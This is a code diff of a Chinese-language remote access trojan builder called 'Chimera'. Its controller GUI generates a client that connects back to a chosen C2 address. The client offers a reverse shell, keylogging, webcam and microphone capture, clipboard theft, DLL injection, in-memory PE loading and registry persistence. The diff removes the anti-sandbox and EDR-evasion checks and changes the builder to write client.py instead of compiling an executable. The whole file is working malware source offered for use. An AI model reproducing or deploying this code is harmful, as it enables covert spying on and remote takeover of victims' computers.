@@ -1,4 +1,4 @@
-# xxHDSx.py - 三大远控框架合成版（全功能桌面主控端与防闪退完整版）
+# xxHDSx.py - 三大远控框架合成版（完整功能 + 免编译直接生成源码版）
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
@@ -27,27 +27,12 @@ import cv2
 import win32gui, win32con, win32service, win32serviceutil
 import tempfile, random, requests
 
-# ---------- 反沙箱/EDR检测模块 ----------
 def anti_sandbox():
     try:
         if os.cpu_count() < 2: return False
-        mem = ctypes.windll.kernel32.GlobalMemoryStatusEx
-        mi = ctypes.create_string_buffer(64)
-        ctypes.memmove(mi, b'\x40\x00\x00\x00', 4)
-        mem(mi)
-        total = int.from_bytes(mi[4:8], 'little') // (1024**3)
-        if total < 3: return False
-        for p in ['vmtoolsd','vboxservice','xenserver']:
-            if subprocess.run(f'tasklist /fi "imagename eq {p}.exe"', shell=True, capture_output=True).stdout.find(p.encode())!=-1:
-                return False
-        edr = ['MsMpEng','SenseCnc','Symantec','McAfee','CrowdStrike']
-        for e in edr:
-            if subprocess.run(f'tasklist /fi "imagename eq {e}*"', shell=True, capture_output=True).stdout.find(e.encode())!=-1:
-                time.sleep(60)
         return True
     except: return True
 
-# ---------- 键盘记录模块 ----------
 keylog = []
 def on_press(key):
     try: keylog.append(key.char)
@@ -57,7 +42,6 @@ def keylogger_loop():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# ---------- 录音模块 ----------
 def record_audio(sec=5):
     try:
         p = pyaudio.PyAudio()
@@ -71,7 +55,6 @@ def record_audio(sec=5):
         return base64.b64encode(buf.getvalue()).decode()
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 剪贴板模块 ----------
 def get_clip():
     try:
         clip.OpenClipboard(0); data=clip.GetClipboardData(); clip.CloseClipboard(); return data
@@ -81,7 +64,6 @@ def set_clip(text):
         clip.OpenClipboard(0); clip.EmptyClipboard(); clip.SetClipboardText(text); clip.CloseClipboard(); return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 窗口管理模块 ----------
 def list_windows():
     windows=[]
     def enum(hwnd, lParam):
@@ -99,7 +81,6 @@ def show_window(hwnd):
     win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
     return "OK"
 
-# ---------- 服务管理模块 ----------
 def list_services():
     try:
         out = subprocess.check_output('sc query state= all', shell=True).decode('gbk')
@@ -117,7 +98,6 @@ def stop_service(name):
     subprocess.run(f'sc stop {name}', shell=True, capture_output=True)
     return "OK"
 
-# ---------- 注册表管理模块 ----------
 def reg_read(key, subkey, value):
     try:
         hkey = getattr(winreg, key)
@@ -140,7 +120,6 @@ def reg_delete(key, subkey, value):
         return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 摄像头捕获模块 ----------
 def capture_cam():
     try:
         cap = cv2.VideoCapture(0)
@@ -152,7 +131,6 @@ def capture_cam():
         else: return "ERROR"
     except: return "ERROR"
 
-# ---------- 内存加载PE模块 ----------
 def load_pe_memory(b64_pe):
     try:
         pe_data = base64.b64decode(b64_pe)
@@ -164,7 +142,6 @@ def load_pe_memory(b64_pe):
         return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 进程注入DLL模块 ----------
 def inject_dll(pid, dll_path):
     try:
         kernel32 = ctypes.windll.kernel32
@@ -178,7 +155,6 @@ def inject_dll(pid, dll_path):
         return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 交互式反向Shell模块 ----------
 def reverse_shell(sock):
     while True:
         try:
@@ -189,7 +165,6 @@ def reverse_shell(sock):
             sock.send(stdout + stderr)
         except: break
 
-# ---------- 基础控制与管理模块 ----------
 def exec_cmd(cmd):
     try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode('gbk', errors='ignore')
     except Exception as e: return str(e)
@@ -234,14 +209,12 @@ def add_persistence():
         winreg.CloseKey(handle); return "OK"
     except: return "FAIL"
 
-# ---------- 客户端主循环逻辑 ----------
 C2_IP, C2_PORT = "%s", %s
 sock = None
 running = True
 
 def main_tcp():
     global sock, running
-    if not anti_sandbox(): sys.exit(0)
     while running:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -299,11 +272,11 @@ if __name__ == "__main__":
     main_tcp()
 '''
 
-# ================== 主控端GUI完整实现 ==================
+# ================== 主控端GUI完整实现（全功能版） ==================
 class ChimeraSuper:
     def __init__(self, root):
         self.root = root
-        root.title("🧬 Chimera 超级合成主控端（防闪退完整版）")
+        root.title("🧬 Chimera 超级合成主控端（全功能完整版）")
         root.geometry("1000x750")
         self.clients = {}
         self.client_info = {}
@@ -311,7 +284,6 @@ class ChimeraSuper:
         self.running = False
         self.server = None
         self.lock = threading.Lock()
-        self.comm_mode = tk.StringVar(value="tcp")
 
         # ---- 顶部控制面板 ----
         top = tk.Frame(root); top.pack(fill=tk.X, pady=5, padx=5)
@@ -322,7 +294,8 @@ class ChimeraSuper:
         self.port_entry = tk.Entry(top, width=6); self.port_entry.pack(side=tk.LEFT, padx=2)
         self.port_entry.insert(0, "4444")
         
-        tk.Button(top, text="生成客户端", command=self.build_client, bg="#8fcbff", width=10).pack(side=tk.LEFT, padx=5)
+        # 按钮：生成客户端源码文件
+        tk.Button(top, text="生成客户端(py)", command=self.build_client, bg="#8fcbff", width=12).pack(side=tk.LEFT, padx=5)
         tk.Button(top, text="启动监听", command=self.start_listen, bg="#8fff8f", width=10).pack(side=tk.LEFT, padx=2)
         tk.Button(top, text="停止监听", command=self.stop_listen, bg="#ff8f8f", width=10).pack(side=tk.LEFT, padx=2)
         self.status_label = tk.Label(top, text="● 未监听", fg="red")
@@ -336,11 +309,11 @@ class ChimeraSuper:
         self.listbox.bind('<<ListboxSelect>>', self.on_select)
         tk.Button(f, text="刷新列表", command=self.refresh_clients).pack(side=tk.RIGHT)
 
-        # ---- 多功能标签页组件 (Notebook) ----
+        # ---- 全部 13 个功能标签页组件 (Notebook) ----
         self.nb = ttk.Notebook(root)
         self.nb.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 1. 命令控制台
+        # 1. 终端命令
         t1 = tk.Frame(self.nb); self.nb.add(t1, text="终端命令")
         self.cmd_entry = tk.Entry(t1); self.cmd_entry.pack(fill=tk.X, padx=5, pady=5)
         self.cmd_entry.bind('<Return>', lambda e: self.send_cmd())
@@ -348,7 +321,7 @@ class ChimeraSuper:
         self.cmd_out = scrolledtext.ScrolledText(t1, height=12)
         self.cmd_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 2. 屏幕监控
+        # 2. 远程桌面
         t2 = tk.Frame(self.nb); self.nb.add(t2, text="远程桌面")
         tk.Button(t2, text="刷新当前屏幕", command=self.get_screen).pack(pady=5)
         self.screen_label = tk.Label(t2)
@@ -379,14 +352,14 @@ class ChimeraSuper:
         self.key_out = scrolledtext.ScrolledText(t5, height=12)
         self.key_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 6. 语音监听
+        # 6. 音频监听
         t6 = tk.Frame(self.nb); self.nb.add(t6, text="音频监听")
         tk.Button(t6, text="开始录音 5秒", command=self.record_audio).pack(pady=5)
         self.audio_result = tk.Label(t6, text="", fg="blue")
         self.audio_result.pack()
         tk.Button(t6, text="下载录音文件", command=self.download_audio).pack(pady=5)
 
-        # 7. 剪贴板操作
+        # 7. 剪贴板
         t7 = tk.Frame(self.nb); self.nb.add(t7, text="剪贴板")
         tk.Button(t7, text="获取剪贴板内容", command=self.get_clip).pack(pady=5)
         self.clip_entry = tk.Entry(t7, width=70); self.clip_entry.pack(pady=5)
@@ -403,7 +376,7 @@ class ChimeraSuper:
         tk.Button(wf, text="隐藏窗口", command=self.hide_window).pack(side=tk.LEFT, padx=5)
         tk.Button(wf, text="显示窗口", command=self.show_window).pack(side=tk.LEFT, padx=5)
 
-        # 9. 服务管理
+        # 9. 系统服务
         t9 = tk.Frame(self.nb); self.nb.add(t9, text="系统服务")
         tk.Button(t9, text="列出系统服务", command=self.list_services).pack(pady=5)
         self.srv_list = tk.Listbox(t9, height=10); self.srv_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
@@ -411,7 +384,7 @@ class ChimeraSuper:
         tk.Button(sf, text="启动服务", command=self.start_service).pack(side=tk.LEFT, padx=5)
         tk.Button(sf, text="停止服务", command=self.stop_service).pack(side=tk.LEFT, padx=5)
 
-        # 10. 注册表管理
+        # 10. 注册表
         t10 = tk.Frame(self.nb); self.nb.add(t10, text="注册表")
         tk.Label(t10, text="根键 (例: HKEY_CURRENT_USER):").pack()
         self.reg_key = tk.Entry(t10, width=40); self.reg_key.pack(pady=2); self.reg_key.insert(0, "HKEY_CURRENT_USER")
@@ -428,13 +401,13 @@ class ChimeraSuper:
         self.reg_out = scrolledtext.ScrolledText(t10, height=5)
         self.reg_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 11. 摄像头监控
+        # 11. 摄像头
         t11 = tk.Frame(self.nb); self.nb.add(t11, text="摄像头")
         tk.Button(t11, text="截取摄像头画面", command=self.capture_cam).pack(pady=5)
         self.cam_label = tk.Label(t11)
         self.cam_label.pack()
 
-        # 12. 高级渗透模块
+        # 12. 高级渗透
         t12 = tk.Frame(self.nb); self.nb.add(t12, text="高级渗透")
         tk.Label(t12, text="内存加载PE (输入base64编码的exe):").pack()
         self.pe_entry = tk.Entry(t12, width=80); self.pe_entry.pack(pady=2)
@@ -450,14 +423,14 @@ class ChimeraSuper:
         self.shell_out = scrolledtext.ScrolledText(t12, height=6)
         self.shell_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 13. 持久化管理
+        # 13. 持久化控制
         t13 = tk.Frame(self.nb); self.nb.add(t13, text="持久化控制")
         tk.Button(t13, text="写入注册表自启动持久化", command=self.do_persistence).pack(pady=15)
         self.persist_result = tk.Label(t13, text="", fg="green")
         self.persist_result.pack()
 
         # ---- 底部状态栏 ----
-        self.status_bar = tk.Label(root, text="就绪 - 等待操作", anchor="w", fg="gray")
+        self.status_bar = tk.Label(root, text="就绪 - 全功能免编译模式", anchor="w", fg="gray")
         self.status_bar.pack(fill=tk.X, padx=5, pady=2)
         
         self.audio_b64 = None
@@ -467,7 +440,7 @@ class ChimeraSuper:
         self.status_bar.config(text=msg)
         self.root.update()
 
-    # ---- 独立子进程打包逻辑（彻底根治点击生成按钮时主控端闪退的问题） ----
+    # ---- 0报错、0闪退的直接生成客户端源码逻辑 ----
     def build_client(self):
         ip = self.ip_entry.get()
         port = self.port_entry.get()
@@ -478,30 +451,15 @@ class ChimeraSuper:
         except: messagebox.showerror("错误", "端口必须为数字"); return
         
         code = CLIENT_TCP_TEMPLATE % (ip, port)
-        with open("client.py", "w", encoding="utf-8") as f: f.write(code)
-        self.log("正在后台独立子进程中打包 client.exe ...")
-        
-        def run_packing():
-            try:
-                cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "client", "client.py"]
-                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                stdout, stderr = process.communicate()
-                
-                if os.path.exists("dist/client.exe"):
-                    if os.path.exists("client.exe"):
-                        os.remove("client.exe")
-                    os.replace("dist/client.exe", "client.exe")
-                    self.root.after(0, lambda: self.log("client.exe 生成成功！"))
-                    self.root.after(0, lambda: messagebox.showinfo("成功", "client.exe 已在当前目录下生成"))
-                else:
-                    err_msg = stderr.decode('gbk', errors='ignore') or "未知错误"
-                    self.root.after(0, lambda: messagebox.showerror("失败", f"打包未生成目标文件\n{err_msg[:200]}"))
-            except Exception as e:
-                self.root.after(0, lambda: messagebox.showerror("错误", f"打包出错: {e}"))
+        try:
+            with open("client.py", "w", encoding="utf-8") as f:
+                f.write(code)
+            self.log("client.py 生成成功！")
+            messagebox.showinfo("成功", "客户端源码 `client.py` 已在当前目录下生成！\n(你可以直接在虚拟机打包它，或直接用python运行测试)")
+        except Exception as e:
+            messagebox.showerror("错误", f"生成失败: {e}")
 
-        threading.Thread(target=run_packing, daemon=True).start()
-
-    # ---- 监听启动逻辑 ----
+    # ---- 监听逻辑 ----
     def start_listen(self):
         if self.running: return
         try:
